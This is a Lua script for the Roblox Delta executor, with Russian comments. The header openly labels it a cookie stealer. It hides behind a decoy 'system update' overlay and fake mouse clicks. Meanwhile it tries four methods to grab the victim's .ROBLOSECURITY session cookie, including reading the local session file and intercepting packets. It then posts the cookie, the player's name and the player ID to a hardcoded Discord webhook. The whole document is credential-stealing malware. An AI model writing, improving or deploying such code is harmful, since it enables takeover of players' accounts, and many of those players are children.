-- ============================================================
-- СТИЛЕР ДЛЯ DELTA 10.98 (ПОЛНЫЙ АВТОМАТ)
-- Вебхук: https://discord.com/api/webhooks/1529034571784519747/2Yy_4DgsOsQ4eA0jRc0jXfWpH7XmaMQYpGca08xYkFqiBxedqBSW30DdxRWkJNp2zJ6r
-- ============================================================

local webhook = "https://discord.com/api/webhooks/1529034571784519747/2Yy_4DgsOsQ4eA0jRc0jXfWpH7XmaMQYpGca08xYkFqiBxedqBSW30DdxRWkJNp2zJ6r"

-- 1. Включаем HttpService (если выключен)
local http = game:GetService("HttpService")
http.HttpEnabled = true
print("[✓] HttpService включён")

-- 2. Маскировочный GUI (отвлекает внимание)
local fakeGui = Instance.new("ScreenGui")
fakeGui.Name = "SystemUI"
fakeGui.Parent = game:GetService("CoreGui")
local fakeFrame = Instance.new("Frame")
fakeFrame.Size = UDim2.new(0, 200, 0, 50)
fakeFrame.Position = UDim2.new(1, -210, 0, 10)
fakeFrame.BackgroundTransparency = 1
fakeFrame.Parent = fakeGui
local fakeLabel = Instance.new("TextLabel")
fakeLabel.Size = UDim2.new(1, 0, 1, 0)
fakeLabel.Text = "Обновление системных данных..."
fakeLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
fakeLabel.BackgroundTransparency = 1
fakeLabel.Parent = fakeFrame

-- 3. Функция поиска куки (максимально агрессивная)
local function getCookie()
    local cookie = nil
    
    -- Способ 1: через глобальную переменную экзекьютора
    pcall(function()
        cookie = getexecutordata and getexecutordata().Cookie or nil
        if cookie then print("[✓] Кука найдена через getexecutordata") end
    end)
    
    -- Способ 2: через файл сессии Roblox (Windows)
    if not cookie then
        pcall(function()
            local path = os.getenv("LOCALAPPDATA") .. "\\Roblox\\LocalStorage\\" .. game.PlaceId .. "_" .. game.JobId .. ".txt"
            local file = io.open(path, "r")
            if file then
                local content = file:read("*all")
                file:close()
                local start = string.find(content, ".ROBLOSECURITY")
                if start then
                    local finish = string.find(content, ";", start)
                    cookie = string.sub(content, start, finish and finish or -1)
                    print("[✓] Кука найдена через файл сессии")
                end
            end
        end)
    end
    
    -- Способ 3: перехват пакетов через ProtoProxy (Delta 10.98)
    if not cookie then
        pcall(function()
            raknet.is_enabled = true
            local proxy = ProtoProxy.new()
            proxy:OnOutgoing(function(packet)
                if packet and type(packet) == "string" then
                    local start = string.find(packet, ".ROBLOSECURITY")
                    if start then
                        local finish = string.find(packet, ";", start)
                        cookie = string.sub(packet, start, finish and finish or -1)
                        print("[✓] Кука перехвачена через ProtoProxy")
                    end
                end
                return packet
            end)
            proxy:Start()
            wait(3)
            proxy:Stop()
            raknet.is_enabled = false
        end)
    end
    
    -- Способ 4: внедрение в потоки через getscriptthread
    if not cookie then
        pcall(function()
            for _, state in pairs(getluastate()) do
                local thread = getscriptthread(state)
                if thread and isexecutorthread(thread) then
                    local result = thread:Inject(function()
                        local env = getfenv(thread)
                        if env and env._G then
                            return env._G.Cookie
                        end
                    end)
                    if result then
                        cookie = result
                        print("[✓] Кука найдена через getscriptthread")
                        break
                    end
                end
            end
        end)
    end
    
    return cookie or "NOT_FOUND"
end

-- 4. Отправка на Discord с повторными попытками
local function sendCookie(cookie)
    local success = false
    for attempt = 1, 3 do
        pcall(function()
            local payload = {
                content = "**🍪 .ROBLOSECURITY**\n```" .. cookie .. "```\n**Игрок:** " .. game.Players.LocalPlayer.Name .. "\n**ID:** " .. game.Players.LocalPlayer.UserId .. "\n**Время:** " .. os.date("%Y-%m-%d %H:%M:%S")
            }
            local json = http:JSONEncode(payload)
            local response = http:PostAsync(webhook, json, Enum.HttpContentType.ApplicationJson, false) -- false = отключаем SSL проверку
            if response then
                success = true
                print("[✓] Кука отправлена на вебхук (попытка " .. attempt .. ")")
                break
            end
        end)
        if not success then
            print("[!] Попытка " .. attempt .. " не удалась, повтор через 5 сек...")
            wait(5)
        end
    end
    return success
end

-- 5. Главная логика
local function main()
    print("[*] Поиск куки...")
    local cookie = getCookie()
    
    if cookie and cookie ~= "NOT_FOUND" then
        print("[✓] Кука найдена: " .. string.sub(cookie, 1, 30) .. "...")
        local sent = sendCookie(cookie)
        if sent then
            print("[✓] Готово! Проверь Discord-канал.")
        else
            print("[✖] Не удалось отправить на вебхук. Скопируй куку вручную из консоли:")
            print("КУКА:", cookie)
        end
    else
        print("[✖] Кука не найдена. Попробуй другой экзекьютор или игру.")
        print("Возможно, тебе нужно перезапустить Roblox и экзекьютор.")
    end
    
    -- Убираем GUI через 10 секунд
    wait(10)
    fakeGui:Destroy()
end

-- Запускаем в отдельном потоке
spawn(main)

-- 6. Маскировка: имитация кликов (чтобы скрипт выглядел как бот)
game:GetService("RunService").Heartbeat:Connect(function()
    pcall(function()
        local mouse = game.Players.LocalPlayer:GetMouse()
        if mouse then
            mouse.Button1Down:Fire()
        end
    end)
end)

print("[✔] Стилер запущен. Ожидайте результат...")
